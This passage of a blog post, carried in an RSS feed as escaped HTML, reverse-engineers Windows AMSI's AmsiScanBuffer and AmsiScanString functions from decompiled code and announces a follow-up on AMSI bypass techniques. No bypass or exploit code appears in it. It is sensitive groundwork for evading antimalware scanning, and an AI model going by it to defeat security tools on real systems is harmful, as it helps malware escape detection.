            (&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;amsiContext) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x49534D41&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(amsiContext &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt;
            &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(amsiContext &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;) 
        {
            var &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x80070057&lt;/span&gt;;    
        } 
        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; 
        {
            &lt;span style=&#34;color:#75715e&#34;&gt;/* ################################ */&lt;/span&gt;
            var &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(amsiContext &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x18&lt;/span&gt;)();
        }
    }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;So the function takes 6 parameters. One of which is the pointer to the &lt;code&gt;AMSI_RESULT&lt;/code&gt; structure as I explained above - &lt;code&gt;*result&lt;/code&gt;. According to MSDN, others include a buffer, which will be
scanned by the anti-malware vendor - &lt;code&gt;buffer&lt;/code&gt;, length of the buffer - &lt;code&gt;length&lt;/code&gt;, filename, URL, unique script ID - &lt;code&gt;contentName&lt;/code&gt; and a handler to the session - &lt;code&gt;HAMSISESSION&lt;/code&gt; structure.&lt;/p&gt;
&lt;p&gt;then the function does some checks against the handle, if the checks turn out to be false, it calls a random function which I haven&amp;rsquo;t analyzed, and continues the execution from the next if condition. else, it continues execution without ever calling that random function. (i named that &amp;lsquo;random function&amp;rsquo; &lt;code&gt;SomeFunc&lt;/code&gt; :3 ).&lt;/p&gt;
&lt;p&gt;then there is a pretty huge if condition, which I&amp;rsquo;m not gonna go through (read the decompiled version and understand it :3 ). And if the condition fails, we call another random function but this time, it&amp;rsquo;s not a random function. it is a function pointer that is extracted from the &lt;code&gt;amsiContext&lt;/code&gt; parameter. And I&amp;rsquo;m pretty much sure that this function pointer is some kind of a handler to the anti-malware vendor&amp;rsquo;s scanning interface.&lt;/p&gt;
&lt;p&gt;This makes sense because to call &lt;code&gt;AmsiScanBuffer&lt;/code&gt;, one has to initialize amsi with &lt;code&gt;AmsiInitialize&lt;/code&gt; and open a session if required with &lt;code&gt;AmsiOpenSession&lt;/code&gt;. And &lt;code&gt;AmsiInitialize&lt;/code&gt; returns a handler and that handler is then passed down to this function as the first parameter (amsiContext).&lt;/p&gt;
&lt;p&gt;So the conclusion is, when &lt;code&gt;AmsiInitialize&lt;/code&gt; function gets called, it initializes the anti-malware vendor, registers it, and returns a handler that contains a pointer to a registered function.&lt;code&gt;AmsiScanBuffer&lt;/code&gt; function is responsible for doing some basic checks on the handler, extracting registered function from the handler and calling it with necessary parameters.&lt;/p&gt;
&lt;h2 id=&#34;amsiscanstring&#34;&gt;AmsiScanString&lt;/h2&gt;
&lt;p&gt;this is pretty much the same as the previous function except this one scan for strings. let&amp;rsquo;s just do a small analysis on this one too for the sake of completeness.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/CSharpLoader/AmsiScanString.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Function check if the string is empty or not.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/CSharpLoader/AmsiScanString1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;here is how the rest of the function looks like.&lt;/p&gt;
&lt;p&gt;Without much analysis, we can clearly say that this one calls &lt;code&gt;AmsiScanString&lt;/code&gt; internally. before that, it checks whether the enum pointed by &lt;code&gt;target&lt;/code&gt; is empty.&lt;/p&gt;
&lt;p&gt;Then there is a loop that increases &lt;code&gt;rax&lt;/code&gt; register until it finds a null byte. This is a strlen. After that, &lt;code&gt;rax&lt;/code&gt; is added to &lt;code&gt;rax&lt;/code&gt; and gets compared to &lt;code&gt;r11&lt;/code&gt;, which holds value &lt;code&gt;0xFFFFFFFF&lt;/code&gt;, if the value in &lt;code&gt;rax&lt;/code&gt; is above &lt;code&gt;0xFFFFFFFF&lt;/code&gt;, it moves &lt;code&gt;0x80070057&lt;/code&gt; to &lt;code&gt;rax&lt;/code&gt; register and returns. else, it calls &lt;code&gt;AmsiScanBuffer&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;And what this function does is pretty simple. it checks if the string length is higher than some value and if yes, it returns after some random value loaded into rax, and else, it simply calls &lt;code&gt;AmsiScanBuffer&lt;/code&gt;.&lt;/p&gt;
&lt;h2 id=&#34;thats-it&#34;&gt;that&amp;rsquo;s it.&lt;/h2&gt;
&lt;p&gt;So yeah that&amp;rsquo;s it for now&amp;hellip; we explored AMSI in-depth in this article. In the next one, We will go through some common AMSI bypass techniques.&lt;/p&gt;
&lt;p&gt;#Spread Anarchy!&lt;/p&gt;
</content>
    </item>
    
  </channel>
</rss>
